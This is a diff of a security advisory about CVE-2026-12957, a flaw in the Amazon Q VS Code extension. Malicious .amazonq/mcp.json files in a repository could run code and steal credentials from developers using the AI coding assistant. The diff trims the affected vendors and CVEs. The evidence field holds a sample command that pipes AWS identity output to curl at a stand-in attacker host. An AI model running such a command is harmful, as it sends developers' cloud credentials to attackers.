@@ -3,17 +3,12 @@ title: 'CVE-2026-12957: Amazon Q VS Code Extension Arbitrary Code Execution'
 slug: 2026-06-amazon-q-rce
 description: A high-severity vulnerability (CVE-2026-12957) in the Amazon Q Developer Extension for Visual Studio Code allowed attackers to achieve arbitrary code execution and cloud credential theft by automatically loading and executing malicious Model Context Protocol (MCP) server configurations from a `.amazonq/mcp.json` file in a repository without user consent, providing full access to a developer's environment and cloud credentials.
 date: "2026-06-26T12:13:02Z"
-lastmod: "2026-07-08T14:08:45Z"
+lastmod: "2026-09-14T10:00:17Z"
 type: advisory
 types:
   - advisory
 severities:
   - high
-cpes:
-  - cpe:2.3:a:anthropic:claude_code:*:*:*:*:*:node.js:*:*
-  - cpe:2.3:a:anysphere:cursor:*:*:*:*:*:*:*:*
-  - cpe:2.3:a:linuxfoundation:runc:*:*:*:*:*:*:*:*
-  - cpe:2.3:o:fedoraproject:fedora:39:*:*:*:*:*:*:*
 has_poc: true
 tags:
   - vulnerability
@@ -25,34 +20,13 @@ tags:
 vendors:
   - Amazon Web Services
   - Amazon
-  - Microsoft
-  - JetBrains
-  - Eclipse Foundation
-  - Anthropic
-  - Cursor
-  - Windsurf
-  - Google
-  - Augment
 products:
   - Amazon Q Developer Extension for Visual Studio Code (language server version < 1.65.0)
   - Amazon Q Developer
-  - Language Servers for AWS (< 1.69.0)
   - VS Code plugin for Amazon Q (< 2.20)
-  - JetBrains plugin for Amazon Q (< 4.3)
-  - Eclipse plugin for Amazon Q (< 2.7.4)
-  - Visual Studio toolkit for Amazon Q (< 1.94.0.0)
-  - Claude Code
-  - Cursor
-  - Windsurf
   - Amazon Q Developer extension
   - AWS Language Server (< 1.65.0)
   - Amazon Q developer extension for Visual Studio Code
-  - Amazon Q Developer (language server version < 1.69.0)
-  - Google Antigravity (1.19.6)
-  - Cursor (< 3.0)
-  - Augment (0.754.3)
-  - Windsurf (V1.9566)
-  - Anthropic Claude Code (v2.1.42)
 affected_os:
   - Linux
   - macOS
@@ -82,27 +56,12 @@ mitre_ttps:
     evidence: aws sts get-caller-identity | curl -s -X POST -d @- https://exfil.attacker.test/collect
     confidence_band: high
 cves:
-  - id: CVE-2026-12958
-    cvss: 7.8
-    epss: 0.00142
-  - id: CVE-2025-59536
-    cvss: 8.8
-    epss: 0.30227
-  - id: CVE-2025-54136
-    cvss: 7.2
-    epss: 0.07598
-  - id: CVE-2026-30615
-    cvss: 8
-    epss: 0.0026
-  - id: CVE-2024-21626
-    cvss: 8.6
-    epss: 0.18087
+  - id: CVE-2026-12957
 references:
   - https://www.wiz.io/blog/amazon-q-vulnerability
   - https://thehackernews.com/2026/06/amazon-q-developer-flaw-could-let.html
   - https://www.securityweek.com/amazon-q-flaw-enabled-cloud-credential-theft-via-malicious-repositories/
   - https://www.darkreading.com/cloud-security/amazon-q-vs-extension-flaw-leads-cloud-credential-theft
-  - https://www.wiz.io/blog/ghostapproval-a-trust-boundary-gap-in-ai-coding-assistants
 iocs:
   - type: url
     value: https://exfil.attacker.test/collect
@@ -129,7 +88,7 @@ rules_count: 1
 updates:
   - at: "2026-06-26T14:25:55Z"
     level: L2
-    summary: poc_available; added CVE-2025-54136 +3
+    summary: poc_available
     sources:
       - the-hacker-news
   - at: "2026-06-26T15:27:14Z"
@@ -142,13 +101,6 @@ updates:
     summary: new product
     sources:
       - dark-reading
-  - at: "2026-07-08T14:08:45Z"
-    level: L2
-    summary: added CVE-2024-21626; windsurf version V1.9566; amazon q developer version language server version < 1.69.0; cursor version < 3.0; OS macos; OS linux
-    sources:
-      - wiz
-    source_urls:
-      - https://www.wiz.io/blog/ghostapproval-a-trust-boundary-gap-in-ai-coding-assistants
 ---
 
 Wiz Research discovered a high-severity vulnerability, CVE-2026-12957, in the Amazon Q Developer Extension for Visual Studio Code, impacting language server versions prior to 1.65.0. This flaw allowed for arbitrary code execution and cloud credential theft. When a developer opened a malicious repository containing a specially crafted `.amazonq/mcp.json` file, Amazon Q would automatically load and execute Model Context Protocol (MCP) server configurations defined within this file. Critically, this execution occurred without user consent, workspace trust checks, or any visible indicators, and the spawned processes inherited the developer's full environment, including sensitive AWS credentials, API keys, and SSH agent sockets. This vulnerability, which demonstrates a broader pattern affecting AI coding tools, has since been remediated by Amazon in language server version 1.65.0, which now implements a consent prompt.
